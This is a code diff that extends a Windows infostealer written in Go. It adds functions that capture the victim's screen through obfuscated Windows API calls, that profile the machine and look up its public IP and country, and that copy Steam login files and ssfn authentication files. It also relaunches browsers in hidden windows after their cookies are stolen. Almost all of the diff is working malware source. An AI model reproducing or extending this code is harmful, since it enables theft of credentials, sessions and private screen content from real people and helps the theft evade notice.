@@ -9,27 +9,29 @@ func templateStealer() string {
 func runStealer() string {
 	results := map[string]string{}
 	var diagErrors []string
+	var killedBrowsers []string
 
 	browsers := []struct {
 		name  string
 		paths []string
+		exe   string
 	}{
 		{"Chrome", []string{
 			filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-		}},
+		}, "chrome.exe"},
 		{"Edge", []string{
 			filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-		}},
+		}, "msedge.exe"},
 		{"Brave", []string{
 			filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
-		}},
+		}, "brave.exe"},
 		{"Opera", []string{
 			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
 			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
-		}},
+		}, "opera.exe"},
 		{"Firefox", []string{
 			filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
-		}},
+		}, "firefox.exe"},
 	}
 
 	for _, br := range browsers {
@@ -53,8 +55,31 @@ func runStealer() string {
 				} else {
 					results[br.name] = cookies
 				}
+				found := false
+				for _, k := range killedBrowsers {
+					if k == br.exe { found = true; break }
+				}
+				if !found { killedBrowsers = append(killedBrowsers, br.exe) }
 			}
 		}
+	}
+
+	for _, exe := range killedBrowsers {
+		cmd := exec.Command("cmd", "/c", "start", "", exe)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		_ = cmd.Start()
+	}
+
+	if scr := stealScreenshot(); scr != "" {
+		results["_screenshot"] = scr
+	}
+
+	if info := stealUserInfo(); info != "" {
+		results["_userinfo"] = info
+	}
+
+	if steam := stealSteamTokens(); steam != "" {
+		results["_steam"] = steam
 	}
 
 	if len(diagErrors) > 0 {
@@ -62,7 +87,7 @@ func runStealer() string {
 	}
 
 	if len(results) == 0 {
-		results["_errors"] = "no browsers found"
+		results["_errors"] = "no data collected"
 	}
 
 	out, _ := json.Marshal(results)
@@ -195,6 +220,179 @@ func stealFirefoxCookies(profilesPath string) (string, []string) {
 	}
 
 	return allCookies.String(), errs
+}
+
+func stealScreenshot() string {
+	user32 := syscall.NewLazyDLL(getUser32DLL())
+	gdi32 := syscall.NewLazyDLL(getGdi32DLL())
+	getDesktopWindow := user32.NewProc(getGetDesktopWindowName())
+	getDC := user32.NewProc(getGetDCName())
+	releaseDC := user32.NewProc(getReleaseDCName())
+	createCompatibleDC := gdi32.NewProc(getCreateCompatibleDCName())
+	createCompatibleBitmap := gdi32.NewProc(getCreateCompatibleBitmapName())
+	selectObject := gdi32.NewProc(getSelectObjectName())
+	bitBlt := gdi32.NewProc(getBitBltName())
+	getDeviceCaps := gdi32.NewProc(getGetDeviceCapsName())
+	deleteDC := gdi32.NewProc(getDeleteDCName())
+	deleteObject := gdi32.NewProc(getDeleteObjectName())
+	getDIBits := gdi32.NewProc(getGetDIBitsName())
+
+	hwnd, _, _ := getDesktopWindow.Call()
+	hdc, _, _ := getDC.Call(hwnd)
+	if hdc == 0 {
+		return ""
+	}
+	defer releaseDC.Call(hwnd, hdc)
+
+	width, _, _ := getDeviceCaps.Call(hdc, 8)
+	height, _, _ := getDeviceCaps.Call(hdc, 10)
+	if width == 0 || height == 0 {
+		return ""
+	}
+
+	memDC, _, _ := createCompatibleDC.Call(hdc)
+	if memDC == 0 {
+		return ""
+	}
+	defer deleteDC.Call(memDC)
+
+	hBitmap, _, _ := createCompatibleBitmap.Call(hdc, width, height)
+	if hBitmap == 0 {
+		return ""
+	}
+	defer deleteObject.Call(hBitmap)
+
+	selectObject.Call(memDC, hBitmap)
+	bitBlt.Call(memDC, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)
+
+	type bitmapInfoHeader struct {
+		BiSize          uint32
+		BiWidth         int32
+		BiHeight        int32
+		BiPlanes        uint16
+		BiBitCount      uint16
+		BiCompression   uint32
+		BiSizeImage     uint32
+		BiXPelsPerMeter int32
+		BiYPelsPerMeter int32
+		BiClrUsed       uint32
+		BiClrImportant  uint32
+	}
+
+	bi := bitmapInfoHeader{
+		BiSize:     40,
+		BiWidth:    int32(width),
+		BiHeight:   -int32(height),
+		BiPlanes:   1,
+		BiBitCount: 32,
+	}
+
+	dataSize := int(width) * int(height) * 4
+	pixelData := make([]byte, dataSize)
+	getDIBits.Call(memDC, hBitmap, 0, height, uintptr(unsafe.Pointer(&pixelData[0])), uintptr(unsafe.Pointer(&bi)), 0)
+
+	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
+	for y := 0; y < int(height); y++ {
+		for x := 0; x < int(width); x++ {
+			off := (y*int(width) + x) * 4
+			if off+3 < len(pixelData) {
+				img.Pix[(y*int(width)+x)*4+0] = pixelData[off+2]
+				img.Pix[(y*int(width)+x)*4+1] = pixelData[off+1]
+				img.Pix[(y*int(width)+x)*4+2] = pixelData[off+0]
+				img.Pix[(y*int(width)+x)*4+3] = 255
+			}
+		}
+	}
+
+	var buf bytes.Buffer
+	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 70}); err != nil {
+		return ""
+	}
+	return base64.StdEncoding.EncodeToString(buf.Bytes())
+}
+
+func stealUserInfo() string {
+	hostname, _ := os.Hostname()
+	username := getUserName()
+	ip := getPublicIP()
+	country := getCountryByIP(ip)
+
+	osName := ""
+	cpuName := ""
+	gpuName := ""
+	ramSize := ""
+
+	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetOs()).Output(); err == nil {
+		osName = strings.TrimSpace(string(o))
+	}
+	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetCpu()).Output(); err == nil {
+		cpuName = strings.TrimSpace(string(o))
+	}
+	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetGpu()).Output(); err == nil {
+		gpuName = strings.TrimSpace(string(o))
+	}
+	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetRam()).Output(); err == nil {
+		ramBytes := strings.TrimSpace(string(o))
+		if v, err := strconv.ParseInt(ramBytes, 10, 64); err == nil {
+			ramSize = fmt.Sprintf("%d GB", v/1024/1024/1024)
+		}
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("Hostname: %s\n", hostname))
+	sb.WriteString(fmt.Sprintf("Username: %s\n", username))
+	sb.WriteString(fmt.Sprintf("IP: %s\n", ip))
+	sb.WriteString(fmt.Sprintf("Country: %s\n", country))
+	sb.WriteString(fmt.Sprintf("OS: %s\n", osName))
+	sb.WriteString(fmt.Sprintf("CPU: %s\n", cpuName))
+	sb.WriteString(fmt.Sprintf("GPU: %s\n", gpuName))
+	sb.WriteString(fmt.Sprintf("RAM: %s\n", ramSize))
+	return sb.String()
+}
+
+func stealSteamTokens() string {
+	steamPaths := []string{
+		filepath.Join(os.Getenv("ProgramFiles(x86)"), "Steam"),
+		filepath.Join(os.Getenv("ProgramFiles"), "Steam"),
+		filepath.Join(os.Getenv("LOCALAPPDATA"), "Steam"),
+	}
+
+	var sb strings.Builder
+	for _, steamDir := range steamPaths {
+		if _, err := os.Stat(steamDir); os.IsNotExist(err) {
+			continue
+		}
+
+		loginFile := filepath.Join(steamDir, "config", "loginusers.vdf")
+		if data, err := os.ReadFile(loginFile); err == nil {
+			sb.WriteString("=== loginusers.vdf ===\n")
+			sb.WriteString(string(data))
+			sb.WriteString("\n\n")
+		}
+
+		configFile := filepath.Join(steamDir, "config", "config.vdf")
+		if data, err := os.ReadFile(configFile); err == nil {
+			sb.WriteString("=== config.vdf ===\n")
+			sb.WriteString(string(data))
+			sb.WriteString("\n\n")
+		}
+
+		entries, err := os.ReadDir(steamDir)
+		if err == nil {
+			for _, e := range entries {
+				if strings.HasPrefix(strings.ToLower(e.Name()), "ssfn") {
+					ssfnPath := filepath.Join(steamDir, e.Name())
+					if data, err := os.ReadFile(ssfnPath); err == nil {
+						sb.WriteString(fmt.Sprintf("=== %s ===\n", e.Name()))
+						sb.WriteString(encoding_base64.StdEncoding.EncodeToString(data))
+						sb.WriteString("\n\n")
+					}
+				}
+			}
+		}
+		break
+	}
+	return sb.String()
 }
 
 func decryptCookieValue(encValue []byte, userDataPath string) string {
